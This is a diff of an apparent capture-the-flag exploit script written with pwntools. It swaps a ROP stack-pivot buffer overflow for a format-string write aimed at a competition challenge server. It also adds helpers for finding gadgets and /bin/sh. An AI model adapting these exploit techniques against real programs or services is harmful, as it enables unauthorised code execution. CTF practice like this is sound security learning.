@@ -1,7 +1,7 @@
 from pwn import *
 from icecream import ic
 
-exe = ELF("./pivot_patched")
+elf = exe = ELF("./floormat_sale")
 
 context.binary = exe
 context.log_level = "debug"
@@ -16,15 +16,14 @@ def start(argv=[], *a, **kw):
         args.GDB = True
     
     if args.REMOTE:
-        return remote("localhost", 1337)
+        return remote("floormatsale.ctf.intigriti.io", 1339)
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
 
 gdbscript = '''
-b *0x0000000000400938
-# b *0x0000000000400967
+b *main
 c
 '''.format(**locals())
 
@@ -35,28 +34,15 @@ def sla(a, b): return io.sendlineafter(a, b)
 def re(a): return io.recv(a)
 def ru(a): return io.recvuntil(a)
 def rl(): return io.recvline()
+def uu64(a): return u64(re(a).ljust(8, b"\x00"))
+def gad(a, b): return ROP(a).find_gadget(b)[0]
+def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
+def binsh(a): return next(a.search(b"/bin/sh\x00"))
 def i(): return io.interactive()
 
 io = start()
 
-# # Useful Gadgets
-# pop_rax = 0x00000000004009bb
-# xchg_rsp_rax = 0x00000000004009bd
-# mov_inside_rax_rax = 0x00000000004009c0
-# nop_rax = 0x00000000004009c8
+sl(b'6')
+sl(fmtstr_payload(10, {elf.sym['employee']: 1}))
 
-
-
-ru("pivot: ")
-pivot = int(re(14).decode(), 16) + 0x22ab71
-ru(">")
-ic(hex(pivot))
-payload = b'a'
-sl(payload)
-
-payload = b'a'*40
-payload += p64(pivot)
-ru(">")
-sl(payload)
-
-i()
+io.interactive()
